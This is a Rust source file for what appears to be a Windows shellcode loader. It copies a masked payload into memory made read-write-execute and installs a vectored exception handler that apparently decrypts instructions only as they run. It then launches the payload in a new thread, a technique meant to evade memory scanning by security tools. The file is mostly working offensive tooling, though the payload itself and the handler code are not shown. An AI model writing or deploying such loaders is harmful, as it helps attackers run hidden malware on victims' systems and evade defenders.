mod utils;
mod veh;
mod payload;

use windows::Win32::System::Diagnostics::Debug::AddVectoredExceptionHandler;
use windows::Win32::System::Memory::{VirtualAlloc, VirtualProtect, VirtualFree, MEM_COMMIT, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
use windows::Win32::System::Threading::{CreateThread, WaitForSingleObject, THREAD_CREATION_FLAGS, INFINITE};
use std::ptr::null_mut;

use utils::*;
use veh::*;
use payload::*;

fn main() -> std::process::ExitCode {
    unsafe {
        // Initialize the map and encryption key from generated payload data
        let (payload_executed_asm, encryption_key) = init_map();
        let payload_size = get_payload_size();

        // Check if we have a valid payload
        if payload_size == 0 {
            log_program_fail("No payload loaded. Please run 'dismantle' first to generate payload data.");
            log_program_fail("Then update the payload.rs module with the generated data.");
            return std::process::ExitCode::FAILURE;
        }

        // Allocate memory for the payload
        let payload_copied = VirtualAlloc(
            None,
            payload_size,
            MEM_COMMIT,
            PAGE_READWRITE,
        );

        if payload_copied.is_null() {
            log_winapi_fail("VirtualAlloc");
            return std::process::ExitCode::FAILURE;
        }

        // Calculate payload bounds
        let payload_lower_bound_addr = payload_copied as *const u8;
        let payload_upper_bound_addr = payload_lower_bound_addr.add(payload_size);

        // Copy the masked payload to allocated memory
        std::ptr::copy_nonoverlapping(
            PAYLOAD.as_ptr(),
            payload_copied as *mut u8,
            payload_size,
        );

        // Change protection to RWX (needed to replace INT3 on exceptions)
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(
            payload_copied,
            payload_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ).is_err() {
            log_winapi_fail("VirtualProtect");
            let _ = VirtualFree(payload_copied, 0, MEM_RELEASE);
            return std::process::ExitCode::FAILURE;
        }

        // Initialize VEH globals
        init_veh_globals(
            &payload_executed_asm,
            &encryption_key,
            payload_lower_bound_addr,
            payload_upper_bound_addr,
        );

        // Install the VEH for payload execution
        let page_guard_veh = AddVectoredExceptionHandler(1, Some(veh_payload));
        if page_guard_veh.is_err() || page_guard_veh.as_ref().unwrap().is_invalid() {
            log_winapi_fail("AddVectoredExceptionHandler");
            let _ = VirtualFree(payload_copied, 0, MEM_RELEASE);
            return std::process::ExitCode::FAILURE;
        }

        // Launch thread that executes the payload
        let run_payload = CreateThread(
            None,
            0,
            Some(std::mem::transmute(payload_copied)),
            Some(null_mut()),
            THREAD_CREATION_FLAGS(0),
            None,
        );

        let Ok(run_payload) = run_payload else {
            log_winapi_fail("CreateThread");
            let _ = VirtualFree(payload_copied, 0, MEM_RELEASE);
            return std::process::ExitCode::FAILURE;
        };

        // Wait for the payload to complete
        let _ = WaitForSingleObject(run_payload, INFINITE);

        // Cleanup
        let _ = VirtualFree(payload_copied, 0, MEM_RELEASE);

        std::process::ExitCode::SUCCESS
    }
}
